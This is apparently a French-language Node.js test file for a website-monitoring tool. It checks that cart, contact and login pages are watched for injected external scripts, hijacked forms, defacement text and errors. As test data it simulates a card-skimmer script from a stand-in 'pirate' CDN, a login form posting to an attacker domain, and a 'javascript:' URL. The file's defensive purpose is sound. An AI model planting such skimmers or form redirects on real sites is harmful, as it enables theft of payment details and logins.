import test from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

// Plusieurs pages par site : panier, contact, connexion.
process.env.DATA_DIR = mkdtempSync(join(tmpdir(), 'suricate-pages-'));

const dbm = await import('../src/db.js');
const { runCheck } = await import('../src/checker.js');
const { resolvePage, pageName } = await import('../src/pages.js');

test('config : pages saisies en texte ou en objets, dédoublonnées et bornées', () => {
  const c = dbm.normalizeConfig({ pages: '/panier | Panier\n\n/contact\n/panier\n  /connexion|  Mon   compte  ' });
  assert.deepEqual(c.pages, [{ url: '/panier', label: 'Panier' }, { url: '/contact', label: '' }, { url: '/connexion', label: 'Mon compte' }]);
  assert.deepEqual(dbm.normalizeConfig({ pages: [{ url: '/a', label: 'A' }, '/b', { nope: 1 }, null] }).pages, [{ url: '/a', label: 'A' }, { url: '/b', label: '' }]);
  assert.equal(dbm.normalizeConfig({ pages: Array.from({ length: 30 }, (_, i) => `/p${i}`) }).pages.length, 10, '10 pages au plus');
  assert.deepEqual(dbm.normalizeConfig({ mode: 'domain', pages: ['/a'] }).pages, [], 'sans objet pour un domaine seul');
  assert.deepEqual(dbm.defaultConfig().pages, []);
});

test('adresse d’une page : même domaine uniquement', () => {
  const site = 'https://www.exemple.fr/accueil';
  assert.equal(resolvePage(site, { url: '/panier' }), 'https://www.exemple.fr/panier');
  assert.equal(resolvePage(site, { url: 'contact?x=1#haut' }), 'https://www.exemple.fr/contact?x=1');
  assert.equal(resolvePage(site, { url: 'https://boutique.exemple.fr/compte' }), 'https://boutique.exemple.fr/compte', 'sous-domaine du même site');
  assert.equal(resolvePage(site, { url: 'https://autre.com/panier' }), null);
  assert.equal(resolvePage(site, { url: 'javascript:alert(1)' }), null);
  assert.equal(resolvePage(site, { url: 'ftp://www.exemple.fr/x' }), null);
  assert.equal(resolvePage(site, { url: '//evil.example/x' }), null);
  assert.equal(pageName('https://www.exemple.fr/panier', { label: 'Panier' }), 'Panier');
  assert.equal(pageName('https://www.exemple.fr/mon%20compte?a=1', {}), '/mon compte?a=1');
});

// ── Un faux site : accueil, panier, contact, connexion ──
const pages = {
  '/': '<html><head><title>Boutique</title></head><body><h1>Boutique</h1><p>Bienvenue</p><p>Produits</p><p>Contact</p><p>Mentions</p><p>Livraison</p></body></html>',
  '/panier': '<html><head><title>Panier</title><script src="/static/cart.js"></script></head><body><h1>Panier</h1><p>Votre panier est vide</p></body></html>',
  '/contact': '<html><head><title>Contact</title></head><body><h1>Contact</h1><form action="/contact/envoi"><input name="m"></form></body></html>',
  '/connexion': '<html><head><title>Connexion</title></head><body><h1>Connexion</h1><form action="/connexion/ok"><input name="u"></form></body></html>',
};
let status500 = false;
const hits = [];
const site = http.createServer((req, res) => {
  const path = new URL(req.url, 'http://x').pathname;
  hits.push(path);
  if (path === '/contact' && status500) { res.writeHead(500); return res.end('boom'); }
  const body = pages[path];
  if (!body) { res.writeHead(404, { 'content-type': 'text/html' }); return res.end('introuvable'); }
  res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
  res.end(body);
});
await new Promise((r) => site.listen(0, '127.0.0.1', r));
const base = `http://127.0.0.1:${site.address().port}`;

const watch = await dbm.createWatch({
  name: 'Boutique', url: `${base}/`, interval: 5,
  config: { checks: { dns: false, tls: false, rdap: false }, failThreshold: 2, pages: [{ url: '/panier', label: 'Panier' }, { url: '/contact', label: 'Contact' }, { url: '/connexion', label: 'Connexion' }] },
});
const types = (r) => r.alerts.map((a) => a.type);
const state = async () => (await dbm.getWatch(watch.id)).state;

test('moteur : les pages sont lues, la référence est posée sans alerte', async () => {
  const r = await runCheck(watch.id);
  assert.deepEqual(types(r), []);
  for (const p of ['/panier', '/contact', '/connexion']) assert.ok(hits.includes(p), `${p} a été contrôlée`);
  const st = (await state()).pages;
  assert.deepEqual(Object.keys(st).sort(), [`${base}/connexion`, `${base}/contact`, `${base}/panier`]);
  assert.equal(st[`${base}/panier`].baseline, true);
  assert.equal(st[`${base}/panier`].title, 'Panier');
  assert.equal(st[`${base}/panier`].code, 200);
  assert.deepEqual(types(await runCheck(watch.id)), [], 'rien ne change : silence');
});

test('moteur : un script externe dans le panier alerte, avec le nom de la page', async () => {
  pages['/panier'] = pages['/panier'].replace('</head>', '<script src="https://cdn.pirate.example/skimmer.js"></script></head>');
  const r = await runCheck(watch.id);
  assert.deepEqual(types(r), ['page_script_added']);
  assert.equal(r.alerts[0].severity, 'critical');
  assert.match(r.alerts[0].title, /Nouveau script externe chargé par la page — page « Panier »/);
  assert.match(r.alerts[0].detail, /cdn\.pirate\.example\/skimmer\.js/);
  assert.match(r.alerts[0].detail, /\/panier/);
  assert.deepEqual(types(await runCheck(watch.id)), [], 'la nouvelle valeur devient la référence');
});

test('moteur : formulaire de connexion détourné vers un autre domaine', async () => {
  pages['/connexion'] = pages['/connexion'].replace('/connexion/ok', 'https://collecte.pirate.example/post');
  const r = await runCheck(watch.id);
  assert.deepEqual(types(r), ['page_form_hijacked']);
  assert.match(r.alerts[0].title, /page « Connexion »/);
  assert.match(r.alerts[0].detail, /collecte\.pirate\.example/);
});

test('moteur : texte suspect sur une page → incident, puis « rétabli » quand il disparaît', async () => {
  pages['/contact'] = pages['/contact'].replace('<h1>Contact</h1>', '<h1>Hacked by Evil Crew</h1>');
  const r = await runCheck(watch.id);
  assert.deepEqual(types(r), ['page_forbidden']);
  assert.equal(r.alerts[0].severity, 'critical');
  assert.match(r.alerts[0].title, /Texte suspect détecté : « hacked by » — page « Contact »/);
  assert.deepEqual(types(await runCheck(watch.id)), []);
  assert.ok(Object.keys((await state()).incidents).some((k) => k.startsWith('page_forbidden:')));
  pages['/contact'] = pages['/contact'].replace('<h1>Hacked by Evil Crew</h1>', '<h1>Contact</h1>');
  const back = await runCheck(watch.id);
  assert.deepEqual(types(back), ['recovery']);
  assert.match(back.alerts[0].title, /^Rétabli : Texte suspect détecté/);
  assert.deepEqual(Object.keys((await state()).incidents), []);
});

test('moteur : une page en erreur n’alerte qu’après plusieurs échecs, sans compter dans la disponibilité du site', async () => {
  status500 = true;
  assert.deepEqual(types(await runCheck(watch.id)), [], '1er échec : pas encore');
  assert.equal((await state()).pages[`${base}/contact`].fails, 1);
  const r = await runCheck(watch.id);
  assert.deepEqual(types(r), ['page_down']);
  assert.equal(r.alerts[0].severity, 'warning');
  assert.match(r.alerts[0].title, /Page inaccessible — page « Contact »/);
  assert.match(r.alerts[0].detail, /Erreur HTTP 500/);
  assert.deepEqual(types(await runCheck(watch.id)), []);
  assert.equal((await state()).outageId ?? null, null, 'le site lui-même n’est pas en panne');
  assert.equal((await dbm.outageList(watch.id)).length, 0);
  assert.equal((await dbm.getWatch(watch.id)).lastCode, 200);

  status500 = false;
  const back = await runCheck(watch.id);
  assert.deepEqual(types(back), ['recovery']);
  assert.match(back.alerts[0].title, /^Rétabli : Page inaccessible/);
});

test('moteur : un échec isolé ne fait pas « rétablir » un texte suspect déjà signalé', async () => {
  pages['/contact'] = pages['/contact'].replace('<h1>Contact</h1>', '<h1>Hacked by Evil Crew</h1>');
  assert.deepEqual(types(await runCheck(watch.id)), ['page_forbidden']);
  status500 = true;
  assert.deepEqual(types(await runCheck(watch.id)), [], 'page muette une fois : l’incident est conservé');
  assert.ok(Object.keys((await state()).incidents).some((k) => k.startsWith('page_forbidden:')));
  status500 = false;
  assert.deepEqual(types(await runCheck(watch.id)), [], 'toujours le même texte : toujours silence');
  pages['/contact'] = pages['/contact'].replace('<h1>Hacked by Evil Crew</h1>', '<h1>Contact</h1>');
  assert.deepEqual(types(await runCheck(watch.id)), ['recovery']);
});

test('moteur : page retirée de la liste → ses incidents disparaissent sans message, nouvelle page = nouvelle référence', async () => {
  pages['/contact'] = pages['/contact'].replace('<h1>Contact</h1>', '<h1>Hacked by Evil Crew</h1>');
  await runCheck(watch.id);
  assert.ok(Object.keys((await state()).incidents).some((k) => k.startsWith('page_forbidden:')));
  const cur = await dbm.getWatch(watch.id);
  await dbm.updateWatch(watch.id, { config: { ...cur.config, pages: [{ url: '/panier', label: 'Panier' }, { url: '/nouvelle', label: '' }] } });
  pages['/nouvelle'] = '<html><head><title>Nouvelle</title></head><body><p>Hacked by quelqu’un</p></body></html>';
  const r = await runCheck(watch.id);
  assert.deepEqual(types(r), ['page_forbidden'], 'la nouvelle page est contrôlée aussitôt (texte suspect), mais pas de « rétabli » pour la page retirée');
  assert.deepEqual(Object.keys((await state()).pages).sort(), [`${base}/nouvelle`, `${base}/panier`]);
  const cur2 = await dbm.getWatch(watch.id);
  await dbm.updateWatch(watch.id, { config: { ...cur2.config, pages: [] } });
  assert.deepEqual(types(await runCheck(watch.id)), [], 'plus aucune page : tout s’efface en silence');
  assert.equal((await state()).pages, undefined);
  assert.deepEqual(Object.keys((await state()).incidents), []);
});

test('moteur : un script ajouté sur une page ne se déclenche pas au 1er passage de cette page', async () => {
  const cur = await dbm.getWatch(watch.id);
  pages['/inscription'] = '<html><head><title>Inscription</title><script src="https://cdn.legitime.example/a.js"></script></head><body><p>Créer un compte</p></body></html>';
  await dbm.updateWatch(watch.id, { config: { ...cur.config, pages: [{ url: '/inscription', label: '' }] } });
  assert.deepEqual(types(await runCheck(watch.id)), [], 'référence posée');
  assert.equal((await state()).pages[`${base}/inscription`].baseline, true);
});

test.after(() => {
  site.close();
  dbm.db.close();
});
